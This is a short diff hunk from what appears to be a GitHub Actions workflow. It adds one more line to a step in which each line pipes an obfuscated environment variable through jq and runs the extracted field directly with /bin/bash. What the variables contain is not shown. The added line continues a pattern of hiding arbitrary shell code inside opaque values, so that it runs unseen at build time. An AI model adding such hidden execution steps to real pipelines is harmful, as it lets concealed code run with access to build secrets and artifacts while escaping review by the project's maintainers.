@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$ipil5" | jq -r .gt73 | /bin/bash
           echo $tgh5 | jq -r .m6 | /bin/bash
           echo $ddosw786 | jq -r .bofgf9033 | /bin/bash
+          echo $u06563 | jq -r .d38718 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
